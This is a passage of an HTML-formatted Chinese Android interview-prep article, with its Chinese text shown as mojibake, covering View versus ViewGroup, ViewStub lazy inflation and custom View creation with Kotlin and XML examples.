</ol>
<h3 data-id="heading-7">å±€é™æ€§</h3>
<p>å°½ç®¡ <code>findViewTreeLifecycleOwner()</code> å®ç”¨æ€§å¼ºï¼Œä½†å®ƒä¾èµ– <code>View</code> æ ‘ä¸­å­˜åœ¨ <code>LifecycleOwner</code>ã€‚è‹¥æœªæ‰¾åˆ°ï¼Œæ–¹æ³•ä¼šè¿”å› <code>null</code>ï¼Œéœ€å¦¥å–„å¤„ç†è¯¥æƒ…å†µï¼Œé¿å…åº”ç”¨å´©æºƒæˆ–å‡ºç°å¼‚å¸¸è¡Œä¸ºã€‚</p>
<p>æ€»ä¹‹ã€‚</p>
<p><code>View</code> çš„ <code>findViewTreeLifecycleOwner()</code> æ–¹æ³•æ˜¯è·å– <code>View</code> æ ‘ä¸­æœ€è¿‘ <code>LifecycleOwner</code> çš„å®ç”¨å·¥å…·ï¼Œç®€åŒ–äº†è‡ªå®šä¹‰ <code>View</code> æˆ–ç¬¬ä¸‰æ–¹åº“ä¸­ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥å‹ç»„ä»¶çš„ä½¿ç”¨ï¼Œæ—¢ä¿è¯äº†æ­£ç¡®çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œåˆé™ä½äº† <code>View</code> ä¸å®¿ä¸»ç»„ä»¶çš„è€¦åˆåº¦ã€‚</p>
<h2 data-id="heading-8">View å’Œ ViewGroup çš„åŒºåˆ«</h2>
<p><code>View</code> å’Œ <code>ViewGroup</code> æ˜¯å®ç° Android UI ç»„ä»¶çš„åŸºç¡€æ¦‚å¿µï¼Œå‡å±äº <code>android.view</code> åŒ…ï¼Œä½†åœ¨ UI å±‚çº§ä¸­æ‰¿æ‹…çš„èŒè´£æˆªç„¶ä¸åŒã€‚</p>
<h3 data-id="heading-9">é¢è¯•é—®é¢˜</h3>
<p>è§£é‡Š <code>requestLayout()</code>ã€<code>invalidate()</code> å’Œ <code>postInvalidate()</code> åœ¨ <code>View</code> ç”Ÿå‘½å‘¨æœŸä¸­çš„ä½œç”¨ï¼Œä»¥åŠå„è‡ªçš„é€‚ç”¨åœºæ™¯ã€‚</p>
<p><code>View</code> ç”Ÿå‘½å‘¨æœŸä¸ <code>Activity</code> ç”Ÿå‘½å‘¨æœŸæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä¸ºä»€ä¹ˆç†è§£äºŒè€…å¯¹å®ç°é«˜æ•ˆ UI æ¸²æŸ“è‡³å…³é‡è¦ï¼Ÿ</p>
<h3 data-id="heading-10">ä»€ä¹ˆæ˜¯ View</h3>
<p><code>View</code> æ˜¯å±å¹•ä¸Šå•ä¸ªçš„çŸ©å½¢ UI å…ƒç´ ï¼Œæ˜¯æ‰€æœ‰ UI ç»„ä»¶ï¼ˆå¦‚<code>Button</code>ã€<code>TextView</code>ã€<code>ImageView</code>ã€<code>EditText</code>ï¼‰çš„åŸºç±»ã€‚æ¯ä¸ª <code>View</code> éƒ½è´Ÿè´£åœ¨å±å¹•ä¸Šç»˜åˆ¶å†…å®¹ï¼Œå¹¶å¤„ç†ç”¨æˆ·äº¤äº’ï¼ˆå¦‚è§¦æ‘¸ã€æŒ‰é”®äº‹ä»¶ï¼‰ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> textView = TextView(context).apply {
    text = <span class="hljs-string">"Hello, World!"</span>
    textSize = <span class="hljs-number">16f</span>
    setTextColor(Color.BLACK)
}
</code></pre>
<h3 data-id="heading-11">è¡¥å……æç¤º</h3>
<p><code>View</code> ç³»ç»Ÿæ˜¯ Android å¼€å‘çš„æ ¸å¿ƒåŸºç¡€ï¼Œæ”¯æ’‘ç€æ•´ä¸ª UI æ¡†æ¶ï¼ˆè´Ÿè´£æ¸²æŸ“ã€æ›´æ–° UI ç»„ä»¶ï¼Œä»¥åŠç®¡ç†ç”¨æˆ·äº¤äº’çš„äº‹ä»¶ç³»ç»Ÿï¼‰ã€‚æŸ¥çœ‹ AOSP ä¸­ <code>View.java</code> çš„å®ç°å¯çŸ¥ï¼Œå…¶ä»£ç é‡è¶…3.4ä¸‡è¡Œâ€”â€”å¦‚æ­¤é«˜çš„å¤æ‚åº¦ï¼Œå‡¸æ˜¾äº†åˆ›å»ºå’Œç®¡ç† <code>View</code> å®ä¾‹æ¶‰åŠçš„å¤§é‡å¤„ç†å·¥ä½œã€‚å› æ­¤ï¼Œä¸å¿…è¦çš„ <code>View</code> åˆ›å»ºä¼šç›´æ¥å½±å“åº”ç”¨æ€§èƒ½ï¼Œå¯¼è‡´å†…å­˜å ç”¨å¢åŠ ã€æ¸²æŸ“é€Ÿåº¦å˜æ…¢ã€‚</p>
<p>ä¼˜åŒ–æ€§èƒ½çš„æ ¸å¿ƒæ–¹æ³•ï¼šå°½é‡é¿å…åˆ›å»ºä¸å¿…è¦çš„ <code>View</code> å®ä¾‹ï¼›å‡å°‘å¸ƒå±€å±‚çº§ï¼ˆä¿æŒUIå±‚çº§æ‰å¹³ã€é«˜æ•ˆï¼‰ï¼Œä»¥æ­¤æå‡åº”ç”¨æµç•…åº¦ã€å“åº”é€Ÿåº¦ï¼Œé™ä½èµ„æºæ¶ˆè€—ã€‚</p>
<h3 data-id="heading-12">ä»€ä¹ˆæ˜¯ ViewGroup</h3>
<p><code>ViewGroup</code> æ˜¯å®¹çº³å¤šä¸ª <code>View</code> æˆ–å…¶ä»– <code>ViewGroup</code> çš„å®¹å™¨ï¼Œæ˜¯å¸ƒå±€ï¼ˆå¦‚ <code>LinearLayout</code>ã€<code>RelativeLayout</code>ã€<code>ConstraintLayout</code>ã€<code>FrameLayout</code>ï¼‰çš„åŸºç±»ã€‚å®ƒä¸»è¦è´Ÿè´£ç®¡ç†å­ <code>View</code> çš„å¸ƒå±€å’Œä½ç½®ï¼Œå®šä¹‰å­ <code>View</code> çš„æµ‹é‡ä¸ç»˜åˆ¶è§„åˆ™ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> linearLayout = LinearLayout(context).apply {
    orientation = LinearLayout.VERTICAL
    addView(TextView(context).apply { text = <span class="hljs-string">"Child 1"</span> })
    addView(TextView(context).apply { text = <span class="hljs-string">"Child 2"</span> })
}
</code></pre>
<h3 data-id="heading-13">è¡¥å……æç¤º</h3>
<p><code>ViewGroup</code> ç»§æ‰¿è‡ª <code>View</code> ï¼ŒåŒæ—¶å®ç°äº† <code>ViewParent</code> å’Œ <code>ViewManager</code> æ¥å£ã€‚ç”±äº <code>ViewGroup</code> ä½œä¸ºå…¶ä»– <code>View</code> çš„å®¹å™¨ï¼Œå…¶å†…éƒ¨å®ç°æ¯”æ ‡å‡† <code>View</code> æ›´å¤æ‚ã€æ›´è€—èµ„æºã€‚è¿‡åº¦åµŒå¥—å¸ƒå±€ï¼ˆå¦‚å¤šå±‚ <code>LinearLayout</code> ï¼‰ä¼šä¸¥é‡å½±å“åº”ç”¨æ€§èƒ½ã€‚</p>
<p><code>ViewParent</code> æ¥å£å®šä¹‰äº†çˆ¶ <code>View</code> ä½œä¸º <code>View</code> å¯¹è±¡å®¹å™¨çš„æ ¸å¿ƒèŒè´£ï¼ŒåŒ…æ‹¬ç®¡ç†å¸ƒå±€æµ‹é‡ã€ç›‘å¬è§¦æ‘¸äº‹ä»¶ç­‰ï¼›<code>ViewManager</code> æ¥å£æä¾›äº†åŠ¨æ€æ·»åŠ /ç§»é™¤å­ <code>View</code> çš„æ–¹æ³•ã€‚</p>
<p>æ­£å› ä¸º <code>ViewGroup</code> éœ€è¦æ‰§è¡Œé¢å¤–çš„å¸ƒå±€è®¡ç®—å¹¶ç®¡ç†å¤šä¸ªå­ <code>View</code> ï¼Œå…¶ç»˜åˆ¶å’Œæµ‹é‡å¼€é”€æ¯”å•ä¸ª <code>View</code> æ›´å¤§ã€‚</p>
<h3 data-id="heading-14">æ ¸å¿ƒåŒºåˆ«</h3>



































<table><thead><tr><th align="left">å¯¹æ¯”ç»´åº¦</th><th align="left">View</th><th align="left">ViewGroup</th></tr></thead><tbody><tr><td align="left"><strong>ç”¨é€”</strong></td><td align="left">å•ä¸ª UI å…ƒç´ ï¼Œç”¨äºæ˜¾ç¤ºå†…å®¹æˆ–ä¸ç”¨æˆ·äº¤äº’</td><td align="left">å®¹å™¨ç»„ä»¶ï¼Œç”¨äºç»„ç»‡å’Œç®¡ç†å¤šä¸ªå­ <code>View</code></td></tr><tr><td align="left"><strong>å±‚çº§</strong></td><td align="left">UI å±‚çº§ä¸­çš„å¶èŠ‚ç‚¹ï¼Œä¸èƒ½åŒ…å«å…¶ä»– <code>View</code></td><td align="left">UI å±‚çº§ä¸­çš„åˆ†æ”¯èŠ‚ç‚¹ï¼Œå¯åŒ…å«å¤šä¸ªå­ <code>View</code> æˆ– <code>ViewGroup</code></td></tr><tr><td align="left"><strong>å¸ƒå±€è¡Œä¸º</strong></td><td align="left">è‡ªèº«å°ºå¯¸å’Œä½ç½®ç”±å¸ƒå±€å‚æ•°ç›´æ¥å®šä¹‰</td><td align="left">é€šè¿‡ç‰¹å®šå¸ƒå±€è§„åˆ™ï¼ˆå¦‚ <code>LinearLayout</code> çš„å‚ç›´/æ°´å¹³æ’åˆ—ï¼‰å®šä¹‰å­ <code>View</code> çš„å°ºå¯¸å’Œä½ç½®</td></tr><tr><td align="left"><strong>äº‹ä»¶å¤„ç†</strong></td><td align="left">ä»…å¤„ç†è‡ªèº«çš„è§¦æ‘¸ã€æŒ‰é”®ç­‰äº‹ä»¶</td><td align="left">é€šè¿‡ <code>onInterceptTouchEvent</code> ç­‰æ–¹æ³•æ‹¦æˆªå¹¶ç®¡ç†å­ <code>View</code> çš„äº‹ä»¶</td></tr><tr><td align="left"><strong>æ€§èƒ½è€ƒé‡</strong></td><td align="left">æ€§èƒ½å¼€é”€è¾ƒä½ï¼Œæ— é¢å¤–å­ <code>View</code> ç®¡ç†æˆæœ¬</td><td align="left">å› å±‚çº§ç»“æ„å¢åŠ æ¸²æŸ“å¤æ‚åº¦ï¼›è¿‡åº¦åµŒå¥—ä¼šå¯¼è‡´æ¸²æŸ“æ—¶é—´å˜é•¿ã€UI æ›´æ–°å˜æ…¢ç­‰æ€§èƒ½é—®é¢˜</td></tr></tbody></table>
<h3 data-id="heading-15">æ€»ç»“</h3>
<p><code>View</code> æ˜¯æ‰€æœ‰ UI å…ƒç´ çš„åŸºç¡€ï¼Œ<code>ViewGroup</code> æ˜¯ç»„ç»‡ç®¡ç†å¤šä¸ª <code>View</code> çš„å®¹å™¨ï¼ŒäºŒè€…å…±åŒæ„æˆäº† Android å¤æ‚ç”¨æˆ·ç•Œé¢çš„æ ¸å¿ƒæ„å»ºå—ã€‚ç†è§£å®ƒä»¬çš„è§’è‰²ä¸åŒºåˆ«ï¼Œæ˜¯ä¼˜åŒ–å¸ƒå±€ç»“æ„ã€ç¡®ä¿åº”ç”¨å…·å¤‡å“åº”å¼ç”¨æˆ·ä½“éªŒçš„å…³é”®ã€‚</p>
<h2 data-id="heading-16">ViewStub</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a92496aa4164bac8fdba66e93cb1fb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769041031&amp;x-signature=ZauWMRP1HNOCVcok7EKdpupRm5M%3D" alt="2.png" loading="lazy"/></p>
<p><code>ViewStub</code> æ˜¯ Android ä¸­ä¸€ç§è½»é‡çº§çš„ä¸å¯è§å ä½ <code>View</code>ï¼Œç”¨äºå»¶è¿ŸåŠ è½½å¸ƒå±€ï¼Œç›´åˆ°æ˜ç¡®éœ€è¦æ˜¾ç¤ºå®ƒæ—¶æ‰è¿›è¡ŒåŠ è½½ã€‚å®ƒçš„æ ¸å¿ƒä»·å€¼åœ¨äºä¼˜åŒ–æ€§èƒ½â€”â€”é¿å…åŠ è½½åº”ç”¨ç”Ÿå‘½å‘¨æœŸä¸­å¯èƒ½æ— éœ€å±•ç¤ºçš„ <code>View</code>ï¼Œä»è€Œå‡å°‘åˆå§‹åŒ–é˜¶æ®µçš„ç³»ç»Ÿå¼€é”€ã€‚</p>
<h3 data-id="heading-17">é¢è¯•é—®é¢˜</h3>
<p><code>ViewStub</code>åŠ è½½åä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
<p>å®ƒå¯¹ <code>View</code> æ ‘çš„å¸ƒå±€æ€§èƒ½å’Œå†…å­˜ä½¿ç”¨æœ‰ä½•å…·ä½“å½±å“ï¼Ÿ</p>
<h3 data-id="heading-18">æ ¸å¿ƒç‰¹æ€§</h3>
<ol>
<li><strong>è½»é‡çº§</strong>ï¼š<code>ViewStub</code> åœ¨åŠ è½½ç›®æ ‡å¸ƒå±€å‰ï¼Œä»…ä½œä¸ºå ä½ç¬¦å­˜åœ¨ï¼Œå ç”¨æå°çš„å†…å­˜ç©ºé—´ï¼Œä¸”ä¸å ç”¨å®é™…å¸ƒå±€ä½ç½®ï¼›</li>
<li><strong>å»¶è¿ŸåŠ è½½</strong>ï¼šç›®æ ‡å¸ƒå±€èµ„æºä»…åœ¨è°ƒç”¨ <code>inflate()</code> æ–¹æ³•ï¼Œæˆ– <code>ViewStub</code> è¢«è®¾ç½®ä¸ºå¯è§æ—¶æ‰ä¼šåŠ è½½ï¼›</li>
<li><strong>å•æ¬¡ä½¿ç”¨</strong>ï¼šå¸ƒå±€åŠ è½½å®Œæˆåï¼Œ<code>ViewStub</code> ä¼šä» <code>View</code> æ ‘ä¸­è¢«æ›¿æ¢ä¸ºåŠ è½½çš„å¸ƒå±€ï¼Œæ— æ³•é‡å¤ä½¿ç”¨ã€‚</li>
</ol>
<h3 data-id="heading-19">å¸¸è§ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li><strong>æ¡ä»¶å¸ƒå±€</strong>ï¼šé€‚ç”¨äºéœ€æ ¹æ®æ¡ä»¶æ˜¾ç¤ºçš„å¸ƒå±€ï¼ˆå¦‚é”™è¯¯æç¤ºã€åŠ è½½è¿›åº¦æ¡ã€å¯é€‰åŠŸèƒ½æ¨¡å—çš„ UI å…ƒç´ ï¼‰ï¼›</li>
<li><strong>å‡å°‘åˆå§‹åŠ è½½æ—¶é—´</strong>ï¼šå»¶è¿ŸåŠ è½½å¤æ‚æˆ–è€—èµ„æºçš„ <code>View</code> ï¼ˆå¦‚å¤§æ•°æ®åˆ—è¡¨ã€å›¾è¡¨ï¼‰ï¼Œæå‡ <code>Activity</code>/<code>Fragment</code> çš„åˆå§‹åŠ è½½é€Ÿåº¦ï¼›</li>
<li><strong>åŠ¨æ€UIå…ƒç´ </strong>ï¼šä»…åœ¨ç”¨æˆ·è§¦å‘ç‰¹å®šæ“ä½œï¼ˆå¦‚ç‚¹å‡»æŒ‰é’®ï¼‰æ—¶ï¼Œæ‰å‘å±å¹•æ·»åŠ åŠ¨æ€å†…å®¹ï¼Œä¼˜åŒ–å†…å­˜ä½¿ç”¨æ•ˆç‡ã€‚</li>
</ol>
<h3 data-id="heading-20">å¦‚ä½•ä½¿ç”¨ ViewStub</h3>
<p>é¦–å…ˆï¼Œåœ¨ <code>XML</code> å¸ƒå±€ä¸­å®šä¹‰ <code>ViewStub</code></p>
<p>åœ¨ <code>XML</code> å¸ƒå±€æ–‡ä»¶ä¸­æ·»åŠ  <code>ViewStub</code>ï¼Œå¹¶é€šè¿‡ <code>android:layout</code> å±æ€§æŒ‡å®šéœ€è¦å»¶è¿ŸåŠ è½½çš„å¸ƒå±€èµ„æºï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span>
    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å¸¸è§„æ˜¾ç¤ºçš„View --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/tv_main"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>
        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"Main Content"</span> /&gt;</span>
    <span class="hljs-comment">&lt;!-- å ä½ViewStubï¼Œå…³è”ç›®æ ‡å¸ƒå±€optional_content --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ViewStub</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/viewStub"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>
        <span class="hljs-attr">android:layout</span>=<span class="hljs-string">"@layout/optional_content"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span>
</code></pre>
<p>ç„¶åï¼Œåœ¨ä»£ç ä¸­åŠ è½½ <code>ViewStub</code>ã€‚</p>
<p>åœ¨ <code>Activity</code> æˆ– <code>Fragment</code> ä¸­ï¼Œé€šè¿‡ <code>findViewById</code> è·å– <code>ViewStub</code> å®ä¾‹ï¼Œåœ¨éœ€è¦æ—¶è°ƒç”¨ <code>inflate()</code> æ–¹æ³•åŠ è½½ç›®æ ‡å¸ƒå±€ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        <span class="hljs-keyword">val</span> viewStub = findViewById&lt;ViewStub&gt;(R.id.viewStub)
        <span class="hljs-comment">// ä»…åœ¨éœ€è¦æ—¶åŠ è½½ç›®æ ‡å¸ƒå±€</span>
        <span class="hljs-keyword">val</span> inflatedView = viewStub.inflate()
        <span class="hljs-comment">// è®¿é—®åŠ è½½å¸ƒå±€ä¸­çš„å­Viewå¹¶è®¾ç½®å†…å®¹</span>
        <span class="hljs-keyword">val</span> optionalTextView = inflatedView.findViewById&lt;TextView&gt;(R.id.optionalText)
        optionalTextView.text = <span class="hljs-string">"Inflated Content"</span>
    }
}
</code></pre>
<h3 data-id="heading-21">ä¼˜åŠ¿</h3>
<ol>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šå»¶è¿ŸåŠ è½½éå¿…éœ€çš„ <code>View</code> ï¼Œå‡å°‘åº”ç”¨åˆå§‹åŒ–æ—¶çš„å†…å­˜å ç”¨ï¼Œæå‡åˆå§‹æ¸²æŸ“é€Ÿåº¦ï¼›</li>
<li><strong>ç®€åŒ–å¸ƒå±€ç®¡ç†</strong>ï¼šæ— éœ€æ‰‹åŠ¨æ·»åŠ æˆ–ç§»é™¤ <code>View</code> ï¼Œå³å¯çµæ´»ç®¡ç†å¯é€‰ UI å…ƒç´ ï¼Œé™ä½å¸ƒå±€ç»´æŠ¤æˆæœ¬ï¼›</li>
<li><strong>æ˜“ç”¨æ€§å¼º</strong>ï¼šAPI ç®€æ´ç›´è§‚ï¼Œæ”¯æŒ <code>XML</code> ç›´æ¥é›†æˆï¼Œæ˜¯å¼€å‘è€…ä¼˜åŒ– UI æ€§èƒ½çš„ä¾¿æ·å·¥å…·ã€‚</li>
</ol>
<h3 data-id="heading-22">å±€é™æ€§</h3>
<ol>
<li><strong>å•æ¬¡ä½¿ç”¨</strong>ï¼šå¸ƒå±€åŠ è½½åï¼Œ<code>ViewStub</code> ä¼šä» <code>View</code> æ ‘ä¸­ç§»é™¤ï¼Œæ— æ³•å†æ¬¡è§¦å‘åŠ è½½æ“ä½œï¼›</li>
<li><strong>åŠŸèƒ½å—é™</strong>ï¼šä½œä¸ºçº¯å ä½ <code>View</code> ï¼ŒåŠ è½½å‰æ— æ³•å¤„ç†ç”¨æˆ·äº¤äº’ï¼Œä¹Ÿä¸èƒ½æ‰§è¡Œå¤æ‚çš„ä¸šåŠ¡é€»è¾‘ã€‚</li>
</ol>
<h3 data-id="heading-23">æ€»ç»“</h3>
<p><code>ViewStub</code> æ˜¯ Android ä¸­ä¼˜åŒ– UI æ€§èƒ½çš„å®ç”¨å·¥å…·ï¼Œé€šè¿‡å»¶è¿ŸåŠ è½½å¸ƒå±€çš„æ ¸å¿ƒæœºåˆ¶ï¼Œæœ‰æ•ˆå‡å°‘å†…å­˜ä½¿ç”¨ï¼Œå°¤å…¶é€‚ç”¨äºæ¡ä»¶å¸ƒå±€æˆ–éå¿…éœ€ <code>View</code> çš„åœºæ™¯ï¼Œèƒ½æ˜¾è‘—æå‡åº”ç”¨å“åº”é€Ÿåº¦ã€‚åˆç†ä½¿ç”¨ <code>ViewStub</code>ï¼Œå¯å¸®åŠ©å¼€å‘è€…æ‰“é€ æ›´é«˜æ•ˆã€æµç•…çš„ç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-24">è‡ªå®šä¹‰ View</h2>
<p>å®ç°è‡ªå®šä¹‰ <code>View</code> æ˜¯åˆ›å»ºå…·å¤‡ç‰¹å®šå¤–è§‚å’Œè¡Œä¸º UI ç»„ä»¶çš„æ ¸å¿ƒæ–¹å¼ï¼Œå°¤å…¶é€‚ç”¨äºéœ€åœ¨å¤šå±å¹•ä¸­å¤ç”¨çš„åœºæ™¯ã€‚</p>
<p>è‡ªå®šä¹‰ <code>View</code> èƒ½ç»Ÿä¸€è§†è§‰å‘ˆç°å’Œäº¤äº’é€»è¾‘ï¼Œä¿è¯åº”ç”¨å†… UI é£æ ¼çš„ä¸€è‡´æ€§å’Œä»£ç çš„å¯ç»´æŠ¤æ€§ï¼›åŒæ—¶è¿˜èƒ½å°è£…å¤æ‚ UI é€»è¾‘ã€æå‡ç»„ä»¶å¤ç”¨ç‡ã€ç®€åŒ–é¡¹ç›®æ•´ä½“ç»“æ„ã€‚</p>
<h3 data-id="heading-25">é¢è¯•é—®é¢˜</h3>
<p>å¦‚ä½•åœ¨è‡ªå®šä¹‰ <code>View</code> ä¸­é«˜æ•ˆä½¿ç”¨è‡ªå®šä¹‰å±æ€§ï¼ŒåŒæ—¶ç¡®ä¿ <code>XML</code> å¸ƒå±€çš„å‘åå…¼å®¹æ€§ï¼Ÿ</p>
<h3 data-id="heading-26">åˆ›å»ºè‡ªå®šä¹‰ View ç±»</h3>
<p>è‹¥åº”ç”¨éœ€è¦æ ‡å‡† UI ç»„ä»¶æ— æ³•å®ç°çš„ç‹¬ç‰¹è®¾è®¡å…ƒç´ ï¼ˆå¦‚è‡ªå®šä¹‰å½¢çŠ¶ã€ç‰¹æ®ŠåŠ¨ç”»æ•ˆæœï¼‰ï¼Œåˆ™å¿…é¡»é€šè¿‡è‡ªå®šä¹‰ <code>View</code> å®ç°ã€‚åœ¨ Android å¼€å‘ä¸­ï¼Œå¯é€šè¿‡ä»¥ä¸‹æ­¥éª¤ç»“åˆ <code>XML</code> åˆ›å»ºè‡ªå®šä¹‰ <code>View</code> ã€‚</p>
<p>é¦–å…ˆï¼Œå®šä¹‰ä¸€ä¸ªç»§æ‰¿è‡ªåŸºç¡€ <code>View</code> ç±»ï¼ˆå¦‚ <code>View</code>ã€<code>ImageView</code>ã€<code>TextView</code>ï¼‰çš„æ–°ç±»ï¼Œç„¶åæ ¹æ®éœ€æ±‚é‡å†™å¿…è¦çš„æ„é€ å‡½æ•°å’Œæ ¸å¿ƒæ–¹æ³•ï¼ˆå¦‚ <code>onDraw()</code>ã€<code>onMeasure()</code>ã€<code>onLayout()</code>ï¼‰ï¼Œä»¥å®ç°è‡ªå®šä¹‰è¡Œä¸ºï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomCircleView</span> <span class="hljs-meta">@JvmOverloads</span> <span class="hljs-keyword">constructor</span>(
    context: Context,
    attrs: AttributeSet? = <span class="hljs-literal">null</span>,
    defStyleAttr: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
) : View(context, attrs, defStyleAttr) {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDraw</span><span class="hljs-params">(canvas: <span class="hljs-type">Canvas</span>)</span></span> {
        <span class="hljs-keyword">super</span>.onDraw(canvas)
        <span class="hljs-keyword">val</span> paint = Paint().apply {
            color = Color.RED
            style = Paint.Style.FILL
        }
        <span class="hljs-comment">// åœ¨Viewä¸­å¿ƒç»˜åˆ¶çº¢è‰²åœ†å½¢</span>
        canvas.drawCircle(width / <span class="hljs-number">2f</span>, height / <span class="hljs-number">2f</span>, width / <span class="hljs-number">4f</span>, paint)
    }
}
</code></pre>
<h3 data-id="heading-27">åœ¨ XML å¸ƒå±€ä¸­ä½¿ç”¨è‡ªå®šä¹‰ View</h3>
<p>åˆ›å»ºè‡ªå®šä¹‰ <code>View</code> ç±»åï¼Œå¯åœ¨ <code>XML</code> å¸ƒå±€æ–‡ä»¶ä¸­ç›´æ¥å¼•ç”¨å®ƒï¼ˆéœ€ä½¿ç”¨å®Œæ•´åŒ…åä½œä¸º <code>XML</code> æ ‡ç­¾ï¼‰ã€‚åç»­è¿˜å¯é€šè¿‡è‡ªå®šä¹‰å±æ€§å‘è¯¥ <code>View</code> ä¼ é€’é…ç½®å‚æ•°ï¼ˆè¯¦è§ä¸‹é¢æ­¥éª¤ï¼‰ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">com.example.CustomCircleView</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"200dp"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"200dp"</span>
    <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">"center"</span> /&gt;</span>
</code></pre>
<h3 data-id="heading-28">æ·»åŠ è‡ªå®šä¹‰å±æ€§ï¼ˆå¯é€‰ï¼‰</h3>
<p>è‹¥éœ€æ”¯æŒä» <code>XML</code> å¸ƒå±€ä¸­é…ç½®è‡ªå®šä¹‰ <code>View</code> çš„å±æ€§ï¼ˆå¦‚é¢œè‰²ã€å°ºå¯¸ï¼‰ï¼Œéœ€åœ¨<code>res/values</code>æ–‡ä»¶å¤¹çš„<code>attrs.xml</code>ä¸­å®šä¹‰è‡ªå®šä¹‰å±æ€§ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">declare-styleable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CustomCircleView"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">attr</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"circleColor"</span> <span class="hljs-attr">format</span>=<span class="hljs-string">"color"</span> /&gt;</span> <span class="hljs-comment">&lt;!-- åœ†å½¢é¢œè‰²å±æ€§ --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">attr</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"circleRadius"</span> <span class="hljs-attr">format</span>=<span class="hljs-string">"dimension"</span> /&gt;</span> <span class="hljs-comment">&lt;!-- åœ†å½¢åŠå¾„å±æ€§ --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">declare-styleable</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span>
</code></pre>
<p>åœ¨è‡ªå®šä¹‰ <code>View</code> çš„æ„é€ å‡½æ•°ä¸­ï¼Œé€šè¿‡ <code>context.obtainStyledAttributes()</code> è·å– <code>XML</code> ä¸­é…ç½®çš„è‡ªå®šä¹‰å±æ€§å€¼ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomCircleView</span> <span class="hljs-meta">@JvmOverloads</span> <span class="hljs-keyword">constructor</span>(
    context: Context,
    attrs: AttributeSet? = <span class="hljs-literal">null</span>,
    defStyleAttr: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
) : View(context, attrs, defStyleAttr) {
    <span class="hljs-keyword">var</span> circleColor: <span class="hljs-built_in">Int</span> = Color.RED <span class="hljs-comment">// é»˜è®¤çº¢è‰²</span>
    <span class="hljs-keyword">var</span> circleRadius: <span class="hljs-built_in">Float</span> = <span class="hljs-number">50f</span> <span class="hljs-comment">// é»˜è®¤åŠå¾„50px</span>
    <span class="hljs-keyword">init</span> {
        <span class="hljs-keyword">val</span> typedArray = context.obtainStyledAttributes(attrs, R.styleable.CustomCircleView)
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è·å–XMLä¸­é…ç½®çš„circleColorï¼Œæœªé…ç½®åˆ™ä½¿ç”¨é»˜è®¤å€¼Color.RED</span>
            circleColor = typedArray.getColor(
                R.styleable.CustomCircleView_circleColor,
                Color.RED
            )
            <span class="hljs-comment">// è·å–XMLä¸­é…ç½®çš„circleRadiusï¼Œæœªé…ç½®åˆ™ä½¿ç”¨é»˜è®¤å€¼50f</span>
            circleRadius = typedArray.getDimension(
